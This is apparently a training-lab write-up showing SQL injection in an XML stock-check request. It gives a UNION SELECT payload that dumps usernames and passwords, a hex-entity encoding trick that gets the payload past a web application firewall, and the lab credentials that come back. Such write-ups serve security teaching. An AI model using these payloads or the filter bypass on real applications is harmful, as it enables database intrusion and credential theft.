# Lab: SQL injection with filter bypass via XML encoding

## Lab

This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account. 

## Hint

A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. We recommend using the Hackvertor extension to do this. 

## Solution

After view details in the end of web we have select options to select localtion to server check stock.

There is a XML format:

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>
        1
    </productId>
    <storeId>
        1
    </storeId>
</stockCheck>
```

__Return: 724 units__

In tag <storeId> inject `+1` after `1`

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>
        1
    </productId>
    <storeId>
        1+1
    </storeId>
</stockCheck>
```

__Return: 959 units__

So we confirm that we can inject query there.

Modify tag <storeId> to `<storeId>1 UNION SLECT username||'~'||password FROM users</storeId>`

__Return: "Attack detected"__

Because a WAF will block requests that contain obvious signs of a SQL injection attack. So we must bypass this by `Hackvertor` extension.

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>
        <@hex_entities>
            1 UNION SELECT username||'~'||password FROM users
        <@/hex_entities>
    </storeId>
    </stockCheck>
```

__Return:__
__724 units__
__wiener~jy95yieqb1if6u2cmxe8__
__carlos~60dc8ocs0appjyntafh2__
__administrator~78fym7ek6kmpqz8uudb7__

So we solved this lab